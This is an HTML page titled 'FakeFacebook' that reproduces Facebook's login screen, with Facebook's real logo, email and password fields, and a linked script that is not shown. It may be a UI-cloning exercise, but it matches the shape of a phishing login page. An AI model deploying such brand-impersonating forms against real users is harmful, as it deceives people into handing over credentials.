<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script defer src="./script.js" type="application/javascript"></script>
    <link href="./style.css" rel="stylesheet" />
    <title>FakeFacebook</title>
  </head>
  <body>
    <main>
      <div class="text">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
        <p>Connect with friends and the world around you on Facebook</p>
      </div>
      <div class="form">
        <input type="text" class="email" placeholder="Email or phone number" />
        <input type="text" class="password" placeholder="Password" />
        <input type="button" class="login" value="Log In" />
        <a href="#">Forgot password?</a>
        <hr />
        <input type="button" class="create-account" value="Create new account" />
        <p><a href="#">Create a page</a> for celebrity, brand or business</p>
      </div>
    </main>
  </body>
</html>
